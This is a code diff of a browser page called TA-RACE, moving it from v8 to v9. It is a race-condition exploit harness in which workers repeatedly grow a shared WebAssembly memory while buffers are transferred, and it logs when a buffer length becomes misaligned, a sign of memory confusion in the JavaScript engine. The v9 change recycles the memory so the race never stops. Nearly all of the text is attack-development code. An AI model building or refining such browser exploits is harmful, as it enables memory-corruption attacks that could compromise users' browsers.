@@ -1,8 +1,8 @@
 <!doctype html>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>TA-RACE v8</title>
+<title>TA-RACE v9</title>
 <body style="background:#000;color:#0f0;font:13px monospace;white-space:pre-wrap;margin:8px">
-<div id=o>[TA-RACE v8] confuse-gated serializer - memory safe</div>
+<div id=o>[TA-RACE v9] recycled WASM mem - race runs forever</div>
 <script>
 const o=document.getElementById('o');
 const log=m=>{o.textContent+="\n"+m;};
@@ -25,9 +25,10 @@ onmessage=async e=>{
   }
   if(e.data.mem){
     who=e.data.who; mem=e.data.mem;
-    lg("on WASM shared mem");
+    lg("on WASM mem");
     let i=0;
     while(true){
+      if(!mem){ await sl(1); continue; }
       try{mem.grow(1);}catch(_){}
       const bl=mem.buffer.byteLength;
       if(bl&0xFFFF){
@@ -63,13 +64,17 @@ try{
   log("[2] SAB -> 2 workers");
 }catch(e){log("[FAIL] SAB: "+e.name);}
 
-let gmem=null;
-try{
-  gmem=new WebAssembly.Memory({initial:1,maximum:8,shared:true});
-  wA.postMessage({mem:gmem,who:'A'});
-  wB.postMessage({mem:gmem,who:'B'});
-  log("[3] shared WASM mem -> 2 workers (max 512KB)");
-}catch(e){log("[-] WASM share blocked: "+e.name);}
+let gmem=null, gen=0;
+function newMem(){
+  try{
+    gmem=new WebAssembly.Memory({initial:1,maximum:8,shared:true});
+    gen++;
+    wA.postMessage({mem:gmem,who:'A'});
+    wB.postMessage({mem:gmem,who:'B'});
+    return true;
+  }catch(e){ log("[-] WASM gen "+gen+": "+e.name); return false; }
+}
+if(newMem()) log("[3] WASM mem gen 1 -> 2 workers");
 
 let inFlight=0;
 wR.onmessage=e=>{
@@ -80,7 +85,7 @@ wR.onmessage=e=>{
 };
 
 (async()=>{
-  let it=0, grows=0;
+  let it=0, grows=0, mems=1;
   log("[*] main loop");
   while(true){
     if(inFlight<24){
@@ -89,7 +94,10 @@ wR.onmessage=e=>{
       try{wR.postMessage({abs:[ab]},[ab]);inFlight++;}catch(_){}
     }
     if(gmem&&((it&0x3F)===0)){
-      try{gmem.grow(1);grows++;}catch(_){}
+      try{ gmem.grow(1); grows++; }catch(_){
+        // memory capped -> recycle to keep the race alive
+        if(newMem()){ mems++; log("[*] mem recycled -> gen "+mems); }
+      }
       const bl=gmem.buffer.byteLength;
       if(bl&0xFFFF){
         log("MAIN CONFUSED bl="+bl);
@@ -98,9 +106,8 @@ wR.onmessage=e=>{
     }
     it++;
     if((it&0x3FF)===0){
-      const hm=performance.memory?(performance.memory.usedJSHeapSize/1048576|0):-1;
-      log("[*] it="+it+" grows="+grows+" heapMB="+hm+" inflight="+inFlight);
-      await new Promise(r=>setTimeout(r,30));
+      log("[*] it="+it+" grows="+grows+" gens="+mems+" inflight="+inFlight);
+      await new Promise(r=>setTimeout(r,25));
     }
   }
 })();
